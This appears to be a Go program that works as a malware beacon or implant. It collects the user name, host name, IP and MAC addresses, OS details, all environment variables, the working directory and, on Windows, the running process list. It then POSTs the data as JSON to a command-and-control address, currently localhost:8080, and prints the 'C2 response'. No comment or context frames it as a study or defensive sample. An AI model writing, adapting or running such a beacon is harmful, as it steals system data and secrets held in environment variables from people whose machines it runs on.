package main

import (
	"fmt"
	"net/http"
	"os"
	"os/user"
	"encoding/json"
	"io/ioutil"
	"net"
	"runtime"
	"bytes"
	"strings"
	"os/exec"
)

func main() {
	username := ""
	usr, err := user.Current()
	if err == nil {
		username = usr.Username
	}
	hostname, _ := os.Hostname()
	ip := ""
	macs := []string{}
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagUp != 0 && len(iface.HardwareAddr) > 0 {
				macs = append(macs, iface.HardwareAddr.String())
			}
			addrs, _ := iface.Addrs()
			for _, addr := range addrs {
				if ip == "" {
					if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
						ip = ipnet.IP.String()
					}
				}
			}
		}
	}
	envVars := os.Environ()
	cwd, _ := os.Getwd()
	procs := []string{}
	if runtime.GOOS == "windows" {
		out, err := exec.Command("tasklist").Output()
		if err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				if strings.TrimSpace(line) != "" {
					procs = append(procs, line)
				}
			}
		}
	}
	data := map[string]interface{}{
		"username": username,
		"hostname": hostname,
		"ip": ip,
		"macs": macs,
		"os": runtime.GOOS,
		"arch": runtime.GOARCH,
		"env": envVars,
		"cwd": cwd,
		"procs": procs,
	}
	jsonData, _ := json.Marshal(data)
	c2url := "http://localhost:8080/"
	req, err := http.NewRequest("POST", c2url, bytes.NewReader(jsonData))
	if err != nil {
		fmt.Println("Failed to create request:", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Failed to send data:", err)
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println("C2 response:", string(body))
}
